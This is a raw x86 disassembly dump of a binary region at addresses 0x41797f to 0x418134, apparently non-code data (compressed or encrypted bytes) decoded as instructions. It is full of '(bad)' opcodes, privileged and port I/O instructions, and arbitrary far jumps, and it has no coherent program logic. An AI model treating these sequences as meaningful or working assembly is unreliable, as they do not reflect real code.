  41797f:	(bad)  
  417980:	retf   0x3261
  417983:	(bad)  
  417984:	fild   QWORD PTR [ebx-0x6a]
  417987:	sub    eax,0xf31af9c4
  41798c:	xor    bl,BYTE PTR [edx-0x137d7988]
  417992:	test   BYTE PTR [ebx-0x141ea9ca],dl
  417998:	cmc    
  417999:	cmp    eax,0x97631fde
  41799e:	xor    eax,0x8c480408
  4179a3:	repnz aam 0x9e
  4179a6:	pop    ecx
  4179a7:	gs cs retf 
  4179aa:	mov    edi,0xbef58f67
  4179af:	inc    esp
  4179b0:	xchg   DWORD PTR [edx],ebx
  4179b2:	retf   0xca17
  4179b5:	(bad)  
  4179b6:	cmp    eax,0x7c4e592c
  4179bb:	xor    BYTE PTR [esi+0x62203e77],0x22
  4179c2:	stos   BYTE PTR es:[edi],al
  4179c3:	inc    esi
  4179c4:	dec    edi
  4179c5:	push   eax
  4179c6:	loope  0x417a44
  4179c8:	(bad)  
  4179c9:	gs sub eax,0x4de1b3ea
  4179cf:	int    0xaa
  4179d1:	xchg   BYTE PTR [ebp+eax*1-0x1bda6fcf],ch
  4179d8:	stc    
  4179d9:	dec    edx
  4179da:	jg     0x417a54
  4179dc:	ds xlat BYTE PTR fs:[ebx]
  4179df:	dec    ebp
  4179e0:	and    BYTE PTR [ebp+ecx*2-0x25],dl
  4179e4:	and    eax,0xc0445bcb
  4179e9:	stos   BYTE PTR es:[edi],al
  4179ea:	pop    ebx
  4179eb:	adc    eax,DWORD PTR [edi]
  4179ed:	inc    eax
  4179ee:	or     BYTE PTR [ebp-0x2b94d684],bh
  4179f4:	call   0x868c94fd
  4179f9:	ins    DWORD PTR es:[edi],dx
  4179fa:	dec    esp
  4179fb:	fucom  st(2)
  4179fd:	cmp    BYTE PTR [eax+0x17],bh
  417a00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a02:	xor    ecx,DWORD PTR [eax-0x48de2236]
  417a08:	add    edx,DWORD PTR [edi+0x31654b42]
  417a0e:	ds js  0x417995
  417a11:	scas   eax,DWORD PTR es:[edi]
  417a12:	lock arpl WORD PTR [edi],bp
  417a15:	aaa    
  417a16:	push   es
  417a17:	fs push edi
  417a19:	and    ah,BYTE PTR ds:0x4c1078c3
  417a1f:	xor    esi,eax
  417a21:	jl     0x4179e4
  417a23:	inc    ebx
  417a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a25:	aad    0x34
  417a27:	or     BYTE PTR [ebx],bh
  417a29:	mov    ecx,0x62fe86e2
  417a2e:	ins    DWORD PTR es:[edi],dx
  417a2f:	and    edi,ebp
  417a31:	jp     0x4179e0
  417a33:	mov    dl,0xfb
  417a35:	daa    
  417a36:	mov    cl,0x87
  417a38:	fnstcw WORD PTR [ebx]
  417a3a:	and    DWORD PTR [edx],edx
  417a3c:	inc    esi
  417a3d:	inc    edx
  417a3e:	in     al,dx
  417a3f:	xor    edx,0x22
  417a42:	sbb    dh,bh
  417a44:	in     eax,0xa
  417a46:	pushf  
  417a47:	pop    ss
  417a48:	bound  eax,QWORD PTR [ebx+edx*8-0x7aa6ea]
  417a4f:	push   edx
  417a50:	push   edx
  417a51:	or     ch,ch
  417a53:	xchg   ecx,eax
  417a54:	jg     0x417a06
  417a56:	int    0x67
  417a58:	mov    esp,0xbe445197
  417a5d:	aad    0x69
  417a5f:	sub    edi,esi
  417a61:	xchg   ebp,eax
  417a62:	stos   BYTE PTR es:[edi],al
  417a63:	pop    ds
  417a64:	dec    esi
  417a65:	xchg   esp,eax
  417a66:	mov    DWORD PTR [eax+edi*2-0x9dcd437],edx
  417a6d:	or     eax,0xc6c810ea
  417a72:	pop    ebx
  417a73:	sub    eax,0x2261e11d
  417a78:	in     eax,0xf9
  417a7a:	fcomp  st(0)
  417a7c:	xor    eax,0xb89cfcae
  417a81:	hlt    
  417a82:	retf   0x7b81
  417a85:	mov    ch,0xfb
  417a87:	test   dl,0x2
  417a8a:	xchg   DWORD PTR [edx-0x7a],ebp
  417a8d:	cmp    edi,DWORD PTR [esi]
  417a8f:	(bad)  
  417a90:	sub    BYTE PTR [ecx-0x5d],ah
  417a93:	sti    
  417a94:	(bad)  
  417a95:	mov    cl,0xd5
  417a97:	sbb    eax,0xacba807d
  417a9c:	out    0x7f,al
  417a9e:	mov    eax,0x381d13f
  417aa3:	mov    dh,0xed
  417aa5:	outs   dx,WORD PTR ds:[esi]
  417aa7:	enter  0x11ba,0x9b
  417aab:	dec    ebx
  417aac:	repnz out 0xb7,eax
  417aaf:	or     eax,0xdfb7db84
  417ab4:	pop    esi
  417ab5:	fdivr  DWORD PTR [ecx-0x7e4a096f]
  417abb:	inc    esp
  417abc:	pop    ecx
  417abd:	ficom  DWORD PTR ds:0x6af49318
  417ac3:	mov    eax,0x60c894b4
  417ac8:	inc    esi
  417ac9:	shr    DWORD PTR [esi+edi*8-0x3],1
  417acd:	sub    BYTE PTR [esi-0x19],bl
  417ad0:	xchg   edi,eax
  417ad1:	(bad)  
  417ad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ad3:	adc    eax,0x7820d4f6
  417ad8:	adc    DWORD PTR [edx+0x79e7fe2d],esp
  417ade:	mov    eax,ds:0xd8fd1f5b
  417ae3:	addr16 int3 
  417ae5:	sahf   
  417ae6:	mov    sp,0x8c47
  417aea:	rol    ebx,1
  417aec:	cmp    DWORD PTR [edx-0x21],ebp
  417aef:	lock sub esi,ecx
  417af2:	mov    edx,0xec87a98f
  417af7:	dec    ebp
  417af8:	pop    esp
  417af9:	and    dh,bh
  417afb:	cwde   
  417afc:	xchg   esi,eax
  417afd:	sub    BYTE PTR [ebx],dh
  417aff:	pop    ebp
  417b00:	pop    ss
  417b01:	jo     0x417ad3
  417b03:	inc    edx
  417b04:	pop    ebx
  417b05:	pop    ebp
  417b06:	adc    cl,BYTE PTR [eax+0x7e]
  417b09:	loop   0x417a91
  417b0b:	imul   ebp,eax,0xb12b434f
  417b11:	xor    esp,DWORD PTR [eax]
  417b13:	sahf   
  417b14:	adc    cl,dl
  417b16:	push   cs
  417b17:	dec    ebx
  417b18:	cmp    esi,0xfffffffc
  417b1b:	lahf   
  417b1c:	scas   eax,DWORD PTR es:[edi]
  417b1d:	imul   ebp,DWORD PTR [edx-0x1a],0x34418db6
  417b24:	sub    DWORD PTR [ebx+0x340205ff],esp
  417b2a:	mov    al,ds:0xc9e50699
  417b2f:	sub    al,BYTE PTR [esi-0x14c9302f]
  417b35:	retf   
  417b36:	clc    
  417b37:	and    al,0x1f
  417b39:	(bad)  [esp+ebp*2+0x77]
  417b3d:	mov    ah,0x87
  417b3f:	xchg   ebp,eax
  417b40:	mov    dl,BYTE PTR [edi+edx*1-0x6a]
  417b44:	in     eax,0xde
  417b46:	mov    ebx,0x122e93b8
  417b4b:	aad    0xf0
  417b4d:	mov    cl,0x97
  417b4f:	sub    al,BYTE PTR [edx-0x4a51e621]
  417b55:	es jb  0x417bd5
  417b58:	mov    edx,0xbe3f087c
  417b5d:	rdtsc  
  417b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b60:	push   ebp
  417b61:	add    bh,BYTE PTR ds:0xff7d01
  417b67:	jg     0x417b22
  417b69:	pop    eax
  417b6a:	push   eax
  417b6b:	and    al,0xbf
  417b6d:	aad    0xf1
  417b6f:	mov    ah,0x70
  417b71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b72:	mov    ch,0x19
  417b74:	or     eax,0x817941ef
  417b79:	daa    
  417b7a:	je     0x417be2
  417b7c:	dec    edi
  417b7d:	pop    ss
  417b7e:	rcr    DWORD PTR [eax-0x72],1
  417b81:	xchg   BYTE PTR [eax+0x36cece10],cl
  417b87:	jb     0x417b13
  417b89:	pop    es
  417b8a:	repz mov ebp,ss
  417b8d:	sbb    al,0x6b
  417b8f:	inc    eax
  417b90:	retf   
  417b91:	mov    esi,0x9e51a10b
  417b96:	adc    ah,BYTE PTR [eax-0x3b]
  417b99:	jns    0x417b42
  417b9b:	sub    DWORD PTR [ebx],edi
  417b9d:	mov    esi,0xc793b0e0
  417ba2:	ret    0x925
  417ba5:	lock dec esi
  417ba7:	pop    ds
  417ba8:	dec    ecx
  417ba9:	jecxz  0x417bcd
  417bab:	cmp    eax,0xfcb8a9b9
  417bb0:	das    
  417bb1:	mov    dl,BYTE PTR [edi]
  417bb3:	pushf  
  417bb4:	pop    ebp
  417bb5:	xchg   edi,eax
  417bb6:	or     al,0x1d
  417bb8:	(bad)  
  417bb9:	nop
  417bba:	iret   
  417bbb:	ss xor esi,esp
  417bbe:	inc    ecx
  417bbf:	test   DWORD PTR [edx],0x3587f392
  417bc5:	push   ecx
  417bc6:	arpl   WORD PTR ds:0x887ce44b,cx
  417bcc:	and    cl,al
  417bce:	jb     0x417c24
  417bd0:	aaa    
  417bd1:	(bad)  
  417bd2:	fadd   DWORD PTR [ecx-0x6c]
  417bd5:	retf   
  417bd6:	push   esi
  417bd7:	repnz mov ch,0x54
  417bda:	test   al,0xf9
  417bdc:	nop
  417bdd:	jle    0x417c0e
  417bdf:	xor    ebx,DWORD PTR [esi-0x372ae1df]
  417be5:	inc    ecx
  417be6:	inc    edi
  417be7:	gs in  al,0x36
  417bea:	add    dl,ch
  417bec:	daa    
  417bed:	xlat   BYTE PTR ds:[ebx]
  417bee:	inc    esp
  417bef:	(bad)  
  417bf0:	dec    ecx
  417bf1:	mov    al,ds:0x721b0710
  417bf6:	loope  0x417bdb
  417bf8:	and    DWORD PTR [ebp-0x4f],0xffffffac
  417bfc:	imul   ebp,edx,0x1a
  417bff:	push   esp
  417c00:	iret   
  417c01:	or     edx,DWORD PTR [ebp+ebx*1-0x2]
  417c05:	push   ebx
  417c06:	fimul  DWORD PTR [esi]
  417c08:	les    eax,FWORD PTR [esi+0x7b33ed6b]
  417c0e:	lods   al,BYTE PTR ds:[esi]
  417c0f:	mov    ds:0x331b5dc,al
  417c14:	fisttp DWORD PTR [ebx+0x65]
  417c17:	ss in  al,dx
  417c19:	xor    DWORD PTR [ecx+ebx*4+0x2fb1edfb],esi
  417c20:	mov    BYTE PTR [edx-0x7],ch
  417c23:	ins    DWORD PTR es:[edi],dx
  417c24:	jns    0x417c4c
  417c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c27:	fistp  WORD PTR [edi]
  417c29:	neg    DWORD PTR [esi-0x519bed99]
  417c2f:	fstp   QWORD PTR [eax]
  417c31:	fsub   DWORD PTR [edi]
  417c33:	mov    dl,0x71
  417c35:	or     dh,BYTE PTR [eax]
  417c37:	mov    esi,0x62d3b4a
  417c3c:	(bad)  
  417c3d:	pop    edx
  417c3e:	int3   
  417c3f:	lahf   
  417c40:	cmp    al,0xd9
  417c42:	sti    
  417c43:	dec    ecx
  417c44:	mov    al,0x82
  417c46:	ja     0x417cc6
  417c48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c49:	xlat   BYTE PTR ds:[ebx]
  417c4a:	push   ds
  417c4b:	push   edi
  417c4c:	loop   0x417cbd
  417c4e:	jb     0x417c91
  417c50:	adc    BYTE PTR [esi+0x1c],0x92
  417c54:	sub    al,0x21
  417c56:	add    eax,0xb9295fb4
  417c5b:	sti    
  417c5c:	in     al,0x7c
  417c5e:	dec    esi
  417c5f:	adc    edx,eax
  417c61:	or     ebx,DWORD PTR [esi]
  417c63:	xchg   BYTE PTR [esi+0x3152152],cl
  417c69:	dec    ebx
  417c6a:	aam    0x6f
  417c6c:	add    bl,bh
  417c6e:	sti    
  417c6f:	jmp    0xa832:0xf8243291
  417c76:	push   0xfffffffe
  417c78:	int3   
  417c79:	jae    0x417ca5
  417c7b:	inc    ecx
  417c7c:	mov    cl,0xa3
  417c7e:	in     eax,0x85
  417c80:	ficom  DWORD PTR [ebx-0x6521fb8d]
  417c86:	xchg   ecx,eax
  417c87:	sub    dl,al
  417c89:	stos   DWORD PTR es:[edi],eax
  417c8a:	into   
  417c8b:	or     bh,BYTE PTR [ecx+0xe]
  417c8e:	sub    eax,0x4be7407d
  417c93:	cmp    esi,DWORD PTR [esi]
  417c95:	(bad)  
  417c96:	dec    ch
  417c98:	aad    0xd6
  417c9a:	cmp    bl,BYTE PTR [esi-0x4bdd5624]
  417ca0:	cmp    edx,DWORD PTR [ebp-0x3eea5428]
  417ca6:	or     DWORD PTR [edx],0x5d
  417ca9:	jne    0x417c94
  417cab:	xchg   ecx,eax
  417cac:	adc    DWORD PTR [ebx+0x183788a1],edx
  417cb2:	cmc    
  417cb3:	sbb    BYTE PTR ds:0x1ecef13d,cl
  417cb9:	repnz xor al,bh
  417cbc:	and    edi,ebx
  417cbe:	pop    edx
  417cbf:	push   cs
  417cc0:	sub    DWORD PTR [ebp+0x1d],eax
  417cc3:	sar    cl,0x54
  417cc6:	jmp    0x48e72156
  417ccb:	mov    ds:0x1573eb1e,eax
  417cd0:	sbb    ah,BYTE PTR [eax]
  417cd2:	xchg   esi,eax
  417cd3:	cmc    
  417cd4:	fwait
  417cd5:	(bad)  
  417cd6:	and    cl,BYTE PTR [ebx]
  417cd8:	ret    
  417cd9:	sub    eax,0x2f16f1e9
  417cde:	xchg   ebx,eax
  417cdf:	push   ebp
  417ce0:	icebp  
  417ce1:	adc    al,0x99
  417ce3:	sub    ch,BYTE PTR [eax]
  417ce5:	dec    esi
  417ce7:	cld    
  417ce8:	das    
  417ce9:	sbb    al,0x16
  417ceb:	(bad)  
  417cec:	mul    BYTE PTR [ebp+0x2f]
  417cef:	or     dl,dl
  417cf1:	loope  0x417ca7
  417cf3:	leave  
  417cf4:	outs   dx,BYTE PTR ds:[esi]
  417cf5:	(bad)  [eax]
  417cf7:	mov    ecx,0xd2a5f80c
  417cfc:	sbb    al,0xae
  417cfe:	mov    dh,0x9e
  417d00:	push   cs
  417d01:	sub    eax,0xbd451ec3
  417d06:	and    al,0xd2
  417d08:	mov    cl,0x1
  417d0a:	pop    edi
  417d0b:	pop    ebx
  417d0c:	push   ebx
  417d0d:	(bad)  
  417d0e:	out    0x59,eax
  417d10:	sbb    eax,0x82aa7548
  417d15:	jp     0x417d55
  417d17:	sbb    ecx,DWORD PTR [edi+0xd3fd287]
  417d1d:	pop    esi
  417d1e:	cmp    cl,0xae
  417d21:	outs   dx,DWORD PTR ds:[esi]
  417d22:	xor    esi,DWORD PTR [esi]
  417d24:	div    ebp
  417d26:	dec    ebp
  417d27:	call   0x6a79b884
  417d2c:	(bad)  
  417d2d:	and    eax,edi
  417d2f:	das    
  417d30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d31:	hlt    
  417d32:	in     al,dx
  417d33:	pop    ss
  417d34:	rcr    BYTE PTR [ebp+0x28],1
  417d37:	and    ebp,ebp
  417d39:	fcomi  st,st(7)
  417d3b:	ja     0x417ce1
  417d3d:	mov    bl,0xb5
  417d3f:	daa    
  417d40:	push   ebp
  417d41:	cld    
  417d42:	pushf  
  417d43:	cmc    
  417d44:	xchg   esi,eax
  417d45:	or     edi,esp
  417d47:	stc    
  417d48:	scas   al,BYTE PTR es:[edi]
  417d49:	into   
  417d4a:	scas   al,BYTE PTR es:[edi]
  417d4b:	adc    edx,DWORD PTR [edx-0x58]
  417d4e:	out    0x1f,eax
  417d50:	mov    esp,0xbc204b44
  417d55:	enter  0x2044,0xea
  417d59:	mov    bl,0x8a
  417d5b:	scas   al,BYTE PTR es:[edi]
  417d5c:	addr16 cmovge esp,eax
  417d60:	cdq    
  417d61:	jp     0x417dad
  417d63:	and    edi,esi
  417d65:	mov    bh,BYTE PTR [ebx+0x731b6cd5]
  417d6b:	adc    eax,0xcfb60e0d
  417d70:	inc    edx
  417d71:	sub    al,0x48
  417d73:	push   eax
  417d74:	jecxz  0x417de9
  417d76:	add    DWORD PTR [ebp+0x4a047cbb],edi
  417d7c:	shl    BYTE PTR [ebx],0x74
  417d7f:	retf   0x4510
  417d82:	sub    BYTE PTR [edx-0x1c],0x24
  417d86:	push   ebx
  417d87:	ds dec edx
  417d89:	push   esp
  417d8a:	xchg   ebx,eax
  417d8b:	nop
  417d8c:	outs   dx,BYTE PTR ss:[esi]
  417d8e:	pop    esi
  417d8f:	cwde   
  417d90:	add    al,0x1f
  417d92:	call   0x6b06:0x6dc9f128
  417d99:	inc    ecx
  417d9a:	mov    WORD PTR [ecx-0x3ae61bc],ss
  417da0:	and    al,0x69
  417da2:	and    eax,0xd0fdee52
  417da7:	sahf   
  417da8:	jae    0x417d5a
  417daa:	adc    al,0x10
  417dac:	mov    eax,0xfd5309fa
  417db1:	scas   al,BYTE PTR es:[edi]
  417db2:	adc    eax,0xf81d05ea
  417db7:	call   edx
  417db9:	and    eax,0xb7ead1ce
  417dbe:	retf   0x13b7
  417dc1:	sub    al,0x7d
  417dc3:	sar    DWORD PTR [edx+eiz*1-0x6c6e83b5],0xc2
  417dcb:	pusha  
  417dcc:	sbb    bl,BYTE PTR [ebx-0x49ae28f3]
  417dd2:	sub    eax,0x823df2b4
  417dd7:	out    dx,al
  417dd8:	daa    
  417dd9:	push   ds
  417dda:	dec    edi
  417ddb:	pop    ebp
  417ddc:	xor    eax,0x7cd94225
  417de1:	in     eax,0xa2
  417de3:	js     0x417d71
  417de5:	or     eax,0x4136ef85
  417dea:	jl     0x417d75
  417dec:	xchg   ecx,eax
  417ded:	mov    al,ah
  417def:	enter  0x4bea,0xcf
  417df3:	jle    0x417e02
  417df5:	lgs    edi,FWORD PTR [eax]
  417df8:	fs push ss
  417dfa:	scas   al,BYTE PTR es:[edi]
  417dfb:	clc    
  417dfc:	jo     0x417e4b
  417dfe:	mov    ch,0xaf
  417e00:	test   eax,0x9b3a4ba3
  417e05:	mov    esi,0xec6183cc
  417e0a:	push   0xf7af509
  417e0f:	sub    edx,DWORD PTR [ebp+edi*4+0x3dff8ecf]
  417e16:	mov    ds:0xfa392a2b,al
  417e1b:	popa   
  417e1c:	or     al,0xe9
  417e1e:	xchg   esp,eax
  417e1f:	pop    ecx
  417e20:	(bad)  
  417e22:	lods   eax,DWORD PTR ds:[esi]
  417e23:	adc    eax,0xb9dc3040
  417e28:	lods   al,BYTE PTR ds:[esi]
  417e29:	(bad)  
  417e2a:	jmp    0x417e52
  417e2c:	mov    edi,0xfb280596
  417e31:	mov    dl,BYTE PTR [ecx+0x5a83a1e0]
  417e37:	cld    
  417e38:	add    eax,0xdbeaaf5
  417e3d:	xchg   ebp,eax
  417e3e:	jecxz  0x417e05
  417e40:	lea    ebx,[ebx]
  417e42:	dec    esp
  417e43:	jne    0x417e00
  417e45:	xchg   ecx,eax
  417e46:	adc    eax,0xc1eb91a1
  417e4b:	imul   edi,ecx,0x74418e7a
  417e51:	xchg   ebp,eax
  417e52:	push   es
  417e53:	and    DWORD PTR [ebp+0x15],edx
  417e56:	dec    edi
  417e57:	fdivr  QWORD PTR [edi+0x7b]
  417e5a:	rcr    dl,cl
  417e5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e5d:	into   
  417e5e:	stc    
  417e5f:	sbb    dl,cl
  417e61:	xor    dl,BYTE PTR [esi+0x6cee631]
  417e67:	jle    0x417e7c
  417e69:	popa   
  417e6a:	(bad)  
  417e6b:	adc    eax,0xf3d7458f
  417e70:	fdivr  DWORD PTR [ecx-0x103942b7]
  417e76:	es ror esi,0x38
  417e7a:	imul   edi,ecx,0xffffffb7
  417e7d:	adc    al,dh
  417e7f:	into   
  417e80:	mov    edx,0x43cf2e69
  417e85:	js     0x417e36
  417e87:	mov    bh,0x6a
  417e89:	cmp    dh,bl
  417e8b:	and    eax,0xfc197659
  417e90:	jnp    0x417e4e
  417e92:	adc    BYTE PTR [esi],dh
  417e94:	xchg   eax,ecx
  417e96:	scas   eax,DWORD PTR es:[edi]
  417e97:	repnz aad 0xcd
  417e9a:	or     DWORD PTR [ecx+eax*4-0x64],esp
  417e9e:	iret   
  417e9f:	cmp    cl,al
  417ea1:	aam    0x0
  417ea3:	out    0x83,al
  417ea5:	add    eax,0x2287141
  417eaa:	and    al,0x3
  417eac:	cmp    ebx,DWORD PTR [ebx-0xd]
  417eaf:	fbstp  TBYTE PTR [ecx]
  417eb1:	push   ebx
  417eb2:	xlat   BYTE PTR ds:[ebx]
  417eb3:	inc    edx
  417eb4:	retf   
  417eb5:	inc    edx
  417eb6:	aas    
  417eb7:	pusha  
  417eb8:	mov    edx,0x8691f3c3
  417ebd:	and    eax,0x14246d48
  417ec2:	or     DWORD PTR [esi],eax
  417ec4:	mov    dl,0xf1
  417ec6:	lahf   
  417ec7:	data16 stos BYTE PTR es:[edi],al
  417ec9:	jbe    0x417eff
  417ecb:	push   ecx
  417ecc:	push   0x4c
  417ece:	fs inc edi
  417ed0:	add    BYTE PTR ds:0x87130bc7,al
  417ed6:	sahf   
  417ed7:	repz (bad) 
  417ed9:	out    0xe1,eax
  417edb:	lods   al,BYTE PTR ds:[esi]
  417edc:	sbb    ch,BYTE PTR [esp+ebx*8]
  417edf:	sbb    DWORD PTR [edx],eax
  417ee1:	in     al,0x9c
  417ee3:	dec    esp
  417ee4:	pop    ebp
  417ee5:	inc    ebx
  417ee6:	cmp    bh,BYTE PTR [edx+0x54]
  417ee9:	adc    dh,BYTE PTR [ecx-0x2f5bf994]
  417eef:	jno    0x417f02
  417ef1:	pop    ds
  417ef2:	test   DWORD PTR [ecx],esi
  417ef4:	imul   ebp,DWORD PTR [edx+0xea1db3b],0xb92e1f8e
  417efe:	push   cs
  417eff:	out    dx,al
  417f00:	icebp  
  417f01:	addr16 std 
  417f03:	inc    eax
  417f04:	ficom  WORD PTR [edx-0x75]
  417f07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f08:	pop    ecx
  417f09:	js     0x417f0c
  417f0b:	dec    ebx
  417f0c:	ins    DWORD PTR es:[edi],dx
  417f0d:	cmp    bh,BYTE PTR [ecx+0x61016629]
  417f13:	xchg   edi,eax
  417f14:	into   
  417f15:	stc    
  417f16:	mov    ch,0x86
  417f18:	inc    ebp
  417f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f1a:	mov    ebx,0xf0a61770
  417f1f:	xor    esi,esp
  417f21:	call   0x5d52d653
  417f26:	and    bh,dh
  417f28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f29:	pop    esp
  417f2a:	popf   
  417f2b:	js     0x417f08
  417f2d:	aad    0xa3
  417f2f:	xchg   esi,eax
  417f30:	push   0xffffff9c
  417f32:	test   BYTE PTR [esi-0x6a],0xa7
  417f36:	mov    ebp,0xd55bd8b0
  417f3b:	mov    esi,0xf8f5c765
  417f40:	shr    DWORD PTR [edx+0x62bcbf7b],1
  417f46:	push   cs
  417f47:	pop    ecx
  417f48:	jl     0x417f66
  417f4a:	frstor [eax+0x11c008d1]
  417f50:	fistp  QWORD PTR [esi+edi*4-0x1c79c7a2]
  417f57:	xchg   ebx,eax
  417f58:	(bad)  
  417f5a:	aad    0x7b
  417f5c:	push   edi
  417f5d:	imul   edi,DWORD PTR [esi-0x74e72159],0xa
  417f64:	out    0x4,eax
  417f66:	popa   
  417f67:	aas    
  417f68:	pop    ebx
  417f69:	hlt    
  417f6a:	inc    ecx
  417f6b:	sbb    esi,edx
  417f6d:	out    0x3d,al
  417f6f:	aad    0xfd
  417f71:	cmp    DWORD PTR [edi],0x73
  417f74:	lock das 
  417f76:	fs retf 0x211f
  417f7a:	ret    
  417f7b:	lahf   
  417f7c:	mov    ebx,0xbd38885
  417f81:	mov    edi,0xb39f9ff7
  417f86:	xchg   esi,eax
  417f87:	xchg   ebx,eax
  417f88:	(bad)  
  417f89:	dec    edx
  417f8a:	clc    
  417f8b:	enter  0xaece,0x81
  417f8f:	repnz push es
  417f91:	jbe    0x417f57
  417f93:	test   BYTE PTR [edx-0x231b2389],dl
  417f99:	addr16 push es
  417f9b:	mov    esi,0xc65454fd
  417fa0:	repz repz or al,0xb0
  417fa4:	int3   
  417fa5:	xor    esi,DWORD PTR [ecx+0xb]
  417fa8:	jmp    0x7be3a93f
  417fad:	sub    eax,0x72110127
  417fb2:	jbe    0x41801e
  417fb4:	xor    edx,DWORD PTR [ebp-0x5c]
  417fb7:	and    al,0x6f
  417fb9:	mov    eax,ds:0x200720e8
  417fbe:	in     al,0x61
  417fc0:	repnz mov ch,0x96
  417fc3:	sbb    BYTE PTR [edi-0xf],0xcc
  417fc7:	adc    al,0x8d
  417fc9:	push   eax
  417fca:	int3   
  417fcb:	xor    dh,BYTE PTR [edx]
  417fcd:	sar    BYTE PTR [esi+0x2128bb6d],cl
  417fd3:	arpl   ax,si
  417fd5:	or     BYTE PTR [esi],dl
  417fd7:	into   
  417fd8:	add    BYTE PTR [ebp-0x17],ah
  417fdb:	mov    dl,BYTE PTR [eax+esi*4+0x58]
  417fdf:	cld    
  417fe0:	test   DWORD PTR [ecx+ebp*4+0x651fc599],ecx
  417fe7:	push   edx
  417fe8:	nop
  417fe9:	retf   0xfdef
  417fec:	sar    DWORD PTR [edx],cl
  417fee:	dec    edi
  417fef:	add    eax,0x2f4ec4d2
  417ff4:	jno    0x41801f
  417ff6:	cmp    al,0xb
  417ff8:	ss cmp ch,dh
  417ffb:	push   ecx
  417ffc:	ss lahf 
  417ffe:	jl     0x418024
  418000:	xor    esp,DWORD PTR [eax+0x69]
  418003:	int    0xd9
  418005:	jno    0x417ff5
  418007:	dec    ecx
  418008:	pop    esi
  418009:	mov    al,ds:0xebef0d32
  41800e:	adc    al,0x5b
  418010:	mov    ch,0xc0
  418012:	pop    ds
  418013:	out    0xd4,al
  418015:	mov    ds:0x35c9e076,al
  41801a:	cmp    eax,0x144457e7
  41801f:	aas    
  418020:	xchg   ecx,eax
  418021:	jnp    0x41804d
  418023:	scas   eax,DWORD PTR es:[edi]
  418024:	xor    DWORD PTR [esi],0xa275aed1
  41802a:	pop    ds
  41802b:	or     esi,esi
  41802d:	pop    esp
  41802e:	cld    
  41802f:	stos   BYTE PTR es:[edi],al
  418030:	add    eax,0xb8fe8caf
  418035:	aas    
  418036:	xchg   edx,edi
  418038:	dec    esi
  418039:	dec    esi
  41803a:	push   ecx
  41803b:	mov    ebp,0xade31573
  418040:	mov    al,ds:0x69abeee9
  418045:	push   0xb6b8feb4
  41804a:	icebp  
  41804b:	test   DWORD PTR [ebx],ecx
  41804d:	in     al,0xf8
  41804f:	pusha  
  418050:	inc    ebp
  418051:	shl    BYTE PTR [ebx+eax*4+0x2a0c1d2d],1
  418058:	scas   al,BYTE PTR es:[edi]
  418059:	ds ins DWORD PTR es:[edi],dx
  41805b:	(bad)  
  41805c:	bnd je 0x4180cb
  41805f:	cs jmp 0x41803e
  418062:	lea    ebx,[eax-0x3e]
  418065:	test   DWORD PTR [ebx],0xb076ead1
  41806b:	clc    
  41806c:	xor    ch,cl
  41806e:	xlat   BYTE PTR ds:[ebx]
  41806f:	cmc    
  418070:	dec    edx
  418071:	inc    ebx
  418072:	push   edi
  418073:	fucomip st,st(5)
  418075:	jne    0x41806f
  418077:	stos   BYTE PTR es:[edi],al
  418078:	xchg   ecx,eax
  418079:	test   eax,0xe9f39300
  41807e:	nop
  41807f:	add    eax,0x258510d2
  418084:	icebp  
  418085:	clc    
  418086:	xor    eax,0xcb985a1b
  41808b:	out    dx,al
  41808c:	imul   DWORD PTR [esi+0x20]
  41808f:	rcl    DWORD PTR [edx-0x5c48f801],1
  418095:	sub    al,0xef
  418097:	push   ebx
  418098:	rcr    bl,1
  41809a:	rcr    DWORD PTR [esi-0x6e9fd3bc],cl
  4180a0:	and    edi,DWORD PTR [ebx-0x33]
  4180a3:	or     eax,0x95324a6c
  4180a8:	cmp    ecx,esi
  4180aa:	push   ds
  4180ab:	push   es
  4180ac:	pop    edi
  4180ad:	shl    BYTE PTR [esi+edi*4-0x512c063f],0xbb
  4180b5:	ins    BYTE PTR es:[edi],dx
  4180b6:	stos   BYTE PTR es:[edi],al
  4180b7:	jae    0x4180b4
  4180b9:	std    
  4180ba:	or     ch,bh
  4180bc:	shl    DWORD PTR ds:0x51a523bd,1
  4180c2:	inc    edi
  4180c3:	add    DWORD PTR [ebp+0x70],ecx
  4180c6:	in     eax,0x42
  4180c8:	sub    esp,DWORD PTR [ecx]
  4180ca:	and    esi,0xffffffcd
  4180cd:	sub    eax,0x94bd45a2
  4180d2:	jmp    0x7d52:0x32f3a0b0
  4180d9:	or     DWORD PTR [eax-0x4c],eax
  4180dc:	jmp    0xd18a:0x9e599dad
  4180e3:	mov    ch,0x45
  4180e5:	out    dx,eax
  4180e6:	sbb    al,0x60
  4180e8:	pop    ebx
  4180e9:	fld    TBYTE PTR [ecx+edx*2-0x49]
  4180ed:	or     ecx,esp
  4180ef:	jbe    0x4180d6
  4180f1:	sbb    eax,0xb874ad4b
  4180f6:	sbb    eax,0x61b7273a
  4180fb:	inc    esi
  4180fd:	ret    
  4180fe:	dec    esi
  4180ff:	mov    BYTE PTR [ebx],0x1e
  418102:	pop    edx
  418103:	in     al,0x50
  418105:	out    0xed,eax
  418107:	dec    ebx
  418108:	retf   0x1b62
  41810b:	stos   DWORD PTR es:[edi],eax
  41810c:	xor    ebp,DWORD PTR [ecx-0x7e]
  41810f:	enter  0x47d6,0x80
  418113:	mov    esp,esi
  418115:	sub    cl,dh
  418117:	fs aas 
  418119:	hlt    
  41811a:	arpl   WORD PTR [edx-0x4737e8bb],di
  418120:	push   ebx
  418121:	sbb    esp,DWORD PTR [ebx-0x4882a67c]
  418127:	mov    bh,0x76
  418129:	xchg   esi,eax
  41812a:	mov    ch,0x5
  41812c:	inc    ebp
  41812d:	mov    dh,0x2e
  41812f:	pop    ebx
  418130:	repz and al,0xf2
  418133:	sti    
  418134:	icebp  
